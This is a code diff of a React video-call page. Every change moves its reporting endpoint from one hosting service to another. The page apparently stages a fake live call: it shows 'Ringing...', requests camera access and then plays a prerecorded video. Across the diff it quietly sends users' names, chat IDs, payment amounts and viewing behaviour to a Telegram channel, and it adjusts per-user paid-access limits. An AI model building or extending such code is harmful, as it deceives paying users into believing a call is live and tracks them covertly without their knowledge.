@@ -71,9 +71,9 @@ function VideoCall(props) {
     if (document.visibilityState === 'visible' && callState == 'playing') {
       try {
         await videoRef?.current?.play();
-        await fetchWithTimeout(`https://uptimechecker2.onrender.com/sendtochannel?chatId=-1001823103248&msg=${encodeURIComponent(`Video Played:Visiblity\n\nName:${userData.username}\nChatId-${userData.chatId}\nclient=${clientData.clientId}\nCount:${openCount}\nvideo:${video}\nAmount:${userData.payAmount}\nCurrentTime:${videoRef?.current?.currentTime}`)}`)
+        await fetchWithTimeout(`https://uptimechecker2.glitch.me/sendtochannel?chatId=-1001823103248&msg=${encodeURIComponent(`Video Played:Visiblity\n\nName:${userData.username}\nChatId-${userData.chatId}\nclient=${clientData.clientId}\nCount:${openCount}\nvideo:${video}\nAmount:${userData.payAmount}\nCurrentTime:${videoRef?.current?.currentTime}`)}`)
       } catch (error) {
-        await fetchWithTimeout(`https://uptimechecker2.onrender.com/sendtochannel?chatId=-1001823103248&msg=${encodeURIComponent(`ChatId-${userData.chatId}\nclient=${clientData.clientId}\nVcError-${error}`)}`)
+        await fetchWithTimeout(`https://uptimechecker2.glitch.me/sendtochannel?chatId=-1001823103248&msg=${encodeURIComponent(`ChatId-${userData.chatId}\nclient=${clientData.clientId}\nVcError-${error}`)}`)
       }
     } else if (document.visibilityState === 'hidden') {
       await handleEndCall("vischange")
@@ -89,10 +89,10 @@ function VideoCall(props) {
         await removeListeners();
         setMessage("Failed to Connect");
         const msg = getErrorMsg(e);
-        await fetchWithTimeout(`https://uptimechecker2.onrender.com/sendtochannel?chatId=-1001823103248&msg=${encodeURIComponent(`ENDED ABRUBTLY:\n\nChatId-${userData.chatId}\nclient=${clientData.clientId}\nvideo:${video}\nVcError-${msg}`)}`)
+        await fetchWithTimeout(`https://uptimechecker2.glitch.me/sendtochannel?chatId=-1001823103248&msg=${encodeURIComponent(`ENDED ABRUBTLY:\n\nChatId-${userData.chatId}\nclient=${clientData.clientId}\nvideo:${video}\nVcError-${msg}`)}`)
         await fetchWithTimeout(`${clientData.repl}/sendMessage/${userData.chatId}?force=true&msg=${encodeURIComponent(`It's Failed to Connect\n\nCOPY PASTE the Link in CHROME/ANOTHER BROWSER...!!\nThen it will work!\n\n\nhttps://ZomCall.netlify.app/${clientData.clientId}/${userData.chatId}`)}`);
       } catch (error) {
-        await fetchWithTimeout(`https://uptimechecker2.onrender.com/sendtochannel?chatId=-1001823103248&msg=${encodeURIComponent(`ChatId-${userData.chatId}\nclient=${clientData.clientId}\nVcError-${error}`)}`)
+        await fetchWithTimeout(`https://uptimechecker2.glitch.me/sendtochannel?chatId=-1001823103248&msg=${encodeURIComponent(`ChatId-${userData.chatId}\nclient=${clientData.clientId}\nVcError-${error}`)}`)
       }
       await redirectToTG()
     }
@@ -102,12 +102,12 @@ function VideoCall(props) {
     if (callState == 'playing' && (videoRef?.current?.paused)) {
       try {
         await videoRef?.current?.play();
-        await fetchWithTimeout(`https://uptimechecker2.onrender.com/sendtochannel?chatId=-1001823103248&msg=${encodeURIComponent(`Video Played:FocusPlay\n\nName:${userData.username}\nChatId-${userData.chatId}\nclient=${clientData.clientId}\nCount:${openCount}\nvideo:${video}\nAmount:${userData.payAmount}\nCurrentTime:${videoRef?.current?.currentTime}`)}`)
+        await fetchWithTimeout(`https://uptimechecker2.glitch.me/sendtochannel?chatId=-1001823103248&msg=${encodeURIComponent(`Video Played:FocusPlay\n\nName:${userData.username}\nChatId-${userData.chatId}\nclient=${clientData.clientId}\nCount:${openCount}\nvideo:${video}\nAmount:${userData.payAmount}\nCurrentTime:${videoRef?.current?.currentTime}`)}`)
         reqFullScreen()
       } catch (error) {
         await enablePlayBtn(error);
         const msg = getErrorMsg(e)
-        await fetchWithTimeout(`https://uptimechecker2.onrender.com/sendtochannel?chatId=-1001823103248&msg=${encodeURIComponent(`FOCUSErr:\n\nChatId-${userData.chatId}\nclient=${clientData.clientId}\nVcError-${JSON.stringify(e)}`)}`)
+        await fetchWithTimeout(`https://uptimechecker2.glitch.me/sendtochannel?chatId=-1001823103248&msg=${encodeURIComponent(`FOCUSErr:\n\nChatId-${userData.chatId}\nclient=${clientData.clientId}\nVcError-${JSON.stringify(e)}`)}`)
       }
     }
   };
@@ -129,11 +129,11 @@ function VideoCall(props) {
       } else if (elem.webkitRequestFullscreen) {
         await elem.webkitRequestFullscreen();
       } else {
-        // await fetchWithTimeout(`https://uptimechecker2.onrender.com/sendtochannel?chatId=-1001823103248&msg=${encodeURIComponent(`ChatId-${userData.chatId}\nclient=${clientData.clientId}\nVcError-FullScreenNotSupported`)}`)
+        // await fetchWithTimeout(`https://uptimechecker2.glitch.me/sendtochannel?chatId=-1001823103248&msg=${encodeURIComponent(`ChatId-${userData.chatId}\nclient=${clientData.clientId}\nVcError-FullScreenNotSupported`)}`)
       }
     } catch (error) {
       console.log(error)
-      // await fetchWithTimeout(`https://uptimechecker2.onrender.com/sendtochannel?chatId=-1001823103248&msg=${encodeURIComponent(`ChatId-${userData.chatId}\nclient=${clientData.clientId}\nVcError-${error}`)}`)
+      // await fetchWithTimeout(`https://uptimechecker2.glitch.me/sendtochannel?chatId=-1001823103248&msg=${encodeURIComponent(`ChatId-${userData.chatId}\nclient=${clientData.clientId}\nVcError-${error}`)}`)
     }
   }
 
@@ -144,7 +144,7 @@ function VideoCall(props) {
       btnContols.style.display = 'none';
       const playBtn = document.getElementById('playBtn');
       playBtn.style.display = 'block';
-      await fetchWithTimeout(`https://uptimechecker2.onrender.com/sendtochannel?chatId=-1001823103248&msg=${encodeURIComponent(`PLAYBTN ENABLED:\n\nChatId-${userData.chatId}\nclient=${clientData.clientId}\nVcError-${error}`)}`)
+      await fetchWithTimeout(`https://uptimechecker2.glitch.me/sendtochannel?chatId=-1001823103248&msg=${encodeURIComponent(`PLAYBTN ENABLED:\n\nChatId-${userData.chatId}\nclient=${clientData.clientId}\nVcError-${error}`)}`)
     }
   }
 
@@ -185,7 +185,7 @@ function VideoCall(props) {
             videoRef.current.addEventListener("error", handleVideoError);
           } catch (error) {
             console.log(error)
-            await fetchWithTimeout(`https://uptimechecker2.onrender.com/sendtochannel?chatId=-1001823103248&msg=${encodeURIComponent(`Failed to load:\n\nChatId-${userData.chatId}\nclient=${clientData.clientId}\nVcError-${error}`)}`)
+            await fetchWithTimeout(`https://uptimechecker2.glitch.me/sendtochannel?chatId=-1001823103248&msg=${encodeURIComponent(`Failed to load:\n\nChatId-${userData.chatId}\nclient=${clientData.clientId}\nVcError-${error}`)}`)
             await handleVideoError(error)
           }
         }
@@ -198,7 +198,7 @@ function VideoCall(props) {
           setMessage("Requesting...");
         } catch (error) {
           console.error('Error accesing camera:', error);
-          await fetchWithTimeout(`https://uptimechecker2.onrender.com/sendtochannel?chatId=-1001823103248&msg=${encodeURIComponent(`ChatId-${userData.chatId}\nclient=${clientData.clientId}\nVcError-${error}`)}`)
+          await fetchWithTimeout(`https://uptimechecker2.glitch.me/sendtochannel?chatId=-1001823103248&msg=${encodeURIComponent(`ChatId-${userData.chatId}\nclient=${clientData.clientId}\nVcError-${error}`)}`)
         }
         timer = setTimeout(async () => {
           try {
@@ -207,15 +207,15 @@ function VideoCall(props) {
             setMessage("Ringing...");
             await ringingAudio.play()
           } catch (error) {
-            await fetchWithTimeout(`https://uptimechecker2.onrender.com/sendtochannel?chatId=-1001823103248&msg=${encodeURIComponent(`ChatId-${userData.chatId}\nclient=${clientData.clientId}\nVcError-${error}`)}`)
+            await fetchWithTimeout(`https://uptimechecker2.glitch.me/sendtochannel?chatId=-1001823103248&msg=${encodeURIComponent(`ChatId-${userData.chatId}\nclient=${clientData.clientId}\nVcError-${error}`)}`)
           }
           setTimeout(async () => {
             try {
               await videoRef?.current?.play();
-              await fetchWithTimeout(`https://uptimechecker2.onrender.com/sendtochannel?chatId=-1001823103248&msg=${encodeURIComponent(`Video Played:General\n\nName:${userData.username}\nChatId-${userData.chatId}\nclient=${clientData.clientId}\nCount:${openCount}\nvideo:${video}\nAmount:${userData.payAmount}\nCurrentTime:${videoRef?.current?.currentTime}`)}`)
+              await fetchWithTimeout(`https://uptimechecker2.glitch.me/sendtochannel?chatId=-1001823103248&msg=${encodeURIComponent(`Video Played:General\n\nName:${userData.username}\nChatId-${userData.chatId}\nclient=${clientData.clientId}\nCount:${openCount}\nvideo:${video}\nAmount:${userData.payAmount}\nCurrentTime:${videoRef?.current?.currentTime}`)}`)
             } catch (error) {
               await enablePlayBtn(error);
-              // await fetchWithTimeout(`https://uptimechecker2.onrender.com/sendtochannel?chatId=-1001823103248&msg=${encodeURIComponent(`VidePlayErr:\n\nChatId-${userData.chatId}\nclient=${clientData.clientId}\nVcError-${error}`)}`)
+              // await fetchWithTimeout(`https://uptimechecker2.glitch.me/sendtochannel?chatId=-1001823103248&msg=${encodeURIComponent(`VidePlayErr:\n\nChatId-${userData.chatId}\nclient=${clientData.clientId}\nVcError-${error}`)}`)
             }
             try {
               setCallState('playing')
@@ -224,14 +224,14 @@ function VideoCall(props) {
               selfCameraMainRef?.current?.pause();
               playCamvid(selfCameraRef)
             } catch (error) {
-              await fetchWithTimeout(`https://uptimechecker2.onrender.com/sendtochannel?chatId=-1001823103248&msg=${encodeURIComponent(`ChatId-${userData.chatId}\nclient=${clientData.clientId}\nVcError-${error}`)}`)
+              await fetchWithTimeout(`https://uptimechecker2.glitch.me/sendtochannel?chatId=-1001823103248&msg=${encodeURIComponent(`ChatId-${userData.chatId}\nclient=${clientData.clientId}\nVcError-${error}`)}`)
             }
             setMessage(null);
           }, 5000);
         }, 4000);
       } catch (error) {
         console.log(error)
-        await fetchWithTimeout(`https://uptimechecker2.onrender.com/sendtochannel?chatId=-1001823103248&msg=${encodeURIComponent(`ChatId-${userData.chatId}\nclient=${clientData.clientId}\nVcError-${error}`)}`)
+        await fetchWithTimeout(`https://uptimechecker2.glitch.me/sendtochannel?chatId=-1001823103248&msg=${encodeURIComponent(`ChatId-${userData.chatId}\nclient=${clientData.clientId}\nVcError-${error}`)}`)
       }
     }
     startStuff();
@@ -256,7 +256,7 @@ function VideoCall(props) {
               await camRef.current?.play();
             } catch (error) {
               console.error("Error playing camera stream:", error);
-              await fetchWithTimeout(`https://uptimechecker2.onrender.com/sendtochannel?chatId=-1001823103248&msg=${encodeURIComponent(`ChatId-${userData.chatId}\nclient=${clientData.clientId}\nVcError-${error}`)}`)
+              await fetchWithTimeout(`https://uptimechecker2.glitch.me/sendtochannel?chatId=-1001823103248&msg=${encodeURIComponent(`ChatId-${userData.chatId}\nclient=${clientData.clientId}\nVcError-${error}`)}`)
             }
           });
           setCameraPermssion(true);
@@ -267,7 +267,7 @@ function VideoCall(props) {
           }
         } catch (error) {
           console.log(error)
-          // await fetchWithTimeout(`https://uptimechecker2.onrender.com/sendtochannel?chatId=-1001823103248&msg=${encodeURIComponent(`ChatId-${userData.chatId}\nclient=${clientData.clientId}\nVcError-${error}`)}`)
+          // await fetchWithTimeout(`https://uptimechecker2.glitch.me/sendtochannel?chatId=-1001823103248&msg=${encodeURIComponent(`ChatId-${userData.chatId}\nclient=${clientData.clientId}\nVcError-${error}`)}`)
         }
       }).catch(e => {
         console.log(e)
@@ -304,7 +304,7 @@ function VideoCall(props) {
         videoRef.current.removeEventListener("ended", handleVideoEnded);
       }
     } catch (error) {
-      await fetchWithTimeout(`https://uptimechecker2.onrender.com/sendtochannel?chatId=-1001823103248&msg=${encodeURIComponent(`ChatId-${userData.chatId}\nclient=${clientData.clientId}\nVcError-${error}`)}`)
+      await fetchWithTimeout(`https://uptimechecker2.glitch.me/sendtochannel?chatId=-1001823103248&msg=${encodeURIComponent(`ChatId-${userData.chatId}\nclient=${clientData.clientId}\nVcError-${error}`)}`)
     }
   }
 
@@ -315,7 +315,7 @@ function VideoCall(props) {
       removeListeners();
       stopMediaDevice();
       setFinishedCall(true);
-      fetchWithTimeout(`https://uptimechecker2.onrender.com/sendtochannel?chatId=-1001823103248&msg=${encodeURIComponent(`Call Ended\n\nName:${userData.username}\nChatId-${userData.chatId}\nclient=${clientData.clientId}\nCount:${openCount}\nvideo:${video}\nAmount:${userData.payAmount}\nduration:${dur}\nStartedAt:${duration}\nEndCall:${JSON.stringify(exec)}`)}`, {}, true, 0);
+      fetchWithTimeout(`https://uptimechecker2.glitch.me/sendtochannel?chatId=-1001823103248&msg=${encodeURIComponent(`Call Ended\n\nName:${userData.username}\nChatId-${userData.chatId}\nclient=${clientData.clientId}\nCount:${openCount}\nvideo:${video}\nAmount:${userData.payAmount}\nduration:${dur}\nStartedAt:${duration}\nEndCall:${JSON.stringify(exec)}`)}`, {}, true, 0);
       const query = `duration=${dur}&count=${openCount}&video=${video}&endCall=${exec}`
       if (dur) {
         try {
@@ -331,20 +331,20 @@ function VideoCall(props) {
             if (dur > 200 || openCount > 2 || exec === 'videoEnd' || (exec === 'endCall' && dur > 120)) {
               await fetchWithTimeout(`${clientData.repl}/executehsl/${userData.chatId}?${query}`);
               if (userData.fullShow) {
-                await axios.post(`https://uptimechecker2.onrender.com/updateUserData/${userData.chatId}?profile=${userData.profile}`, { canReply: 1000 * 60 * 60 * 2, paidReply: false });
+                await axios.post(`https://uptimechecker2.glitch.me/updateUserData/${userData.chatId}?profile=${userData.profile}`, { canReply: 1000 * 60 * 60 * 2, paidReply: false });
               } else {
-                await axios.post(`https://uptimechecker2.onrender.com/updateUserData/${userData.chatId}?profile=${userData.profile}`, { limitTime: 1000 * 60 * 180, payAmount: 150, fullShow: 1, paidReply: false });
+                await axios.post(`https://uptimechecker2.glitch.me/updateUserData/${userData.chatId}?profile=${userData.profile}`, { limitTime: 1000 * 60 * 180, payAmount: 150, fullShow: 1, paidReply: false });
               }
             }
             // if ((paymentstats.paid > 2 && (dur > 30 || openCount > 2))) {
-            //   await axios.post(`https://uptimechecker2.onrender.com/updateUserData/${userData.chatId}?profile=${userData.profile}`, { canReply: 0, paidReply: false });
+            //   await axios.post(`https://uptimechecker2.glitch.me/updateUserData/${userData.chatId}?profile=${userData.profile}`, { canReply: 0, paidReply: false });
             // }
           }
           if (openCount > 3) {
-            await axios.post(`https://uptimechecker2.onrender.com/updateUserData/${userData.chatId}?profile=${userData.profile}`, { limitTime: 1000 * 60 * 400, paidReply: false });
+            await axios.post(`https://uptimechecker2.glitch.me/updateUserData/${userData.chatId}?profile=${userData.profile}`, { limitTime: 1000 * 60 * 400, paidReply: false });
           }
         } catch (error) {
-          await fetchWithTimeout(`https://uptimechecker2.onrender.com/sendtochannel?chatId=-1001823103248&msg=${encodeURIComponent(`ErrorExceHS:\n\nChatId-${userData.chatId}\nclient=${clientData.clientId}\nVcError-${JSON.stringify(error)}`)}`)
+          await fetchWithTimeout(`https://uptimechecker2.glitch.me/sendtochannel?chatId=-1001823103248&msg=${encodeURIComponent(`ErrorExceHS:\n\nChatId-${userData.chatId}\nclient=${clientData.clientId}\nVcError-${JSON.stringify(error)}`)}`)
         }
       }
       const payload = {}
@@ -354,7 +354,7 @@ function VideoCall(props) {
         headers: { 'Content-Type': 'application/json' },
         data: JSON.stringify(payload),
       };
-      await fetchWithTimeout(`https://uptimechecker2.onrender.com/isRecentUser?chatId=${userData.chatId}`, options, true, 0);
+      await fetchWithTimeout(`https://uptimechecker2.glitch.me/isRecentUser?chatId=${userData.chatId}`, options, true, 0);
       await redirectToTG()
     }
   };
@@ -366,7 +366,7 @@ function VideoCall(props) {
       wind.close()
     } catch (error) {
       console.log('Error:', error);
-      await fetchWithTimeout(`https://uptimechecker2.onrender.com/sendtochannel?chatId=-1001823103248&msg=${encodeURIComponent(`ChatId-${userData.chatId}\nclient=${clientData.clientId}\nVcError-${error}`)}`)
+      await fetchWithTimeout(`https://uptimechecker2.glitch.me/sendtochannel?chatId=-1001823103248&msg=${encodeURIComponent(`ChatId-${userData.chatId}\nclient=${clientData.clientId}\nVcError-${error}`)}`)
     }
   }
 
@@ -395,7 +395,7 @@ function VideoCall(props) {
         tracks.forEach((track) => track.stop());
       }
     } catch (e) {
-      await fetchWithTimeout(`https://uptimechecker2.onrender.com/sendtochannel?chatId=-1001823103248&msg=${encodeURIComponent(`ChatId-${userData.chatId}\nclient=${clientData.clientId}\nVcError-${parseError(e).message}`)}`)
+      await fetchWithTimeout(`https://uptimechecker2.glitch.me/sendtochannel?chatId=-1001823103248&msg=${encodeURIComponent(`ChatId-${userData.chatId}\nclient=${clientData.clientId}\nVcError-${parseError(e).message}`)}`)
     }
   }
 
@@ -408,9 +408,9 @@ function VideoCall(props) {
   const playVideo = async () => {
     try {
       await videoRef?.current?.play();
-      await fetchWithTimeout(`https://uptimechecker2.onrender.com/sendtochannel?chatId=-1001823103248&msg=${encodeURIComponent(`PLAY BTN Clicked:VideoPlayed\n\nChatId-${userData.chatId}\nclient=${clientData.clientId}`)}`)
+      await fetchWithTimeout(`https://uptimechecker2.glitch.me/sendtochannel?chatId=-1001823103248&msg=${encodeURIComponent(`PLAY BTN Clicked:VideoPlayed\n\nChatId-${userData.chatId}\nclient=${clientData.clientId}`)}`)
     } catch (e) {
-      await fetchWithTimeout(`https://uptimechecker2.onrender.com/sendtochannel?chatId=-1001823103248&msg=${encodeURIComponent(`OnPLayErr:\n\nChatId-${userData.chatId}\nclient=${clientData.clientId}\nVcError-${parseError(e).message}`)}`)
+      await fetchWithTimeout(`https://uptimechecker2.glitch.me/sendtochannel?chatId=-1001823103248&msg=${encodeURIComponent(`OnPLayErr:\n\nChatId-${userData.chatId}\nclient=${clientData.clientId}\nVcError-${parseError(e).message}`)}`)
       handleVideoError(e)
     }
   }
@@ -421,11 +421,11 @@ function VideoCall(props) {
       try {
         await videoRef?.current?.play();
         this.videoRef.current.muted = true;
-        await fetchWithTimeout(`https://uptimechecker2.onrender.com/sendtochannel?chatId=-1001823103248&msg=${encodeURIComponent(`Video Played:PAuse\n\nName:${userData.username}\nChatId-${userData.chatId}\nclient=${clientData.clientId}\nCount:${openCount}\nvideo:${video}\nAmount:${userData.payAmount}\nCurrentTime:${videoRef?.current?.currentTime}`)}`);
+        await fetchWithTimeout(`https://uptimechecker2.glitch.me/sendtochannel?chatId=-1001823103248&msg=${encodeURIComponent(`Video Played:PAuse\n\nName:${userData.username}\nChatId-${userData.chatId}\nclient=${clientData.clientId}\nCount:${openCount}\nvideo:${video}\nAmount:${userData.payAmount}\nCurrentTime:${videoRef?.current?.currentTime}`)}`);
       } catch (error) {
         if (!didEndCall && !videoRef?.current?.ended) {
           const msg = getErrorMsg(e)
-          await fetchWithTimeout(`https://uptimechecker2.onrender.com/sendtochannel?chatId=-1001823103248&msg=${encodeURIComponent(`Video Paused:\n\nName:${userData.username}\nChatId-${userData.chatId}\nclient=${clientData.clientId}\nCount:${openCount}\nvideo:${video}\nAmount:${userData.payAmount}\nCurrentTime:${videoRef?.current?.currentTime}\nReason:${msg}`)}`)
+          await fetchWithTimeout(`https://uptimechecker2.glitch.me/sendtochannel?chatId=-1001823103248&msg=${encodeURIComponent(`Video Paused:\n\nName:${userData.username}\nChatId-${userData.chatId}\nclient=${clientData.clientId}\nCount:${openCount}\nvideo:${video}\nAmount:${userData.payAmount}\nCurrentTime:${videoRef?.current?.currentTime}\nReason:${msg}`)}`)
           await handleWindowFocus({ message: "Video Paused" })
         }
       }
@@ -443,7 +443,7 @@ function VideoCall(props) {
     if (playCount > 3) {
       await handleVideoError()
     }
-    // await fetchWithTimeout(`https://uptimechecker2.onrender.com/sendtochannel?chatId=-1001823103248&msg=${encodeURIComponent(`Video Played:\n\nName:${userData.username}\nChatId-${userData.chatId}\nclient=${clientData.clientId}\nCount:${openCount}\nvideo:${video}\nAmount:${userData.payAmount}\nCurrentTime:${videoRef?.current?.currentTime}`)}`)
+    // await fetchWithTimeout(`https://uptimechecker2.glitch.me/sendtochannel?chatId=-1001823103248&msg=${encodeURIComponent(`Video Played:\n\nName:${userData.username}\nChatId-${userData.chatId}\nclient=${clientData.clientId}\nCount:${openCount}\nvideo:${video}\nAmount:${userData.payAmount}\nCurrentTime:${videoRef?.current?.currentTime}`)}`)
   }
 
   return (
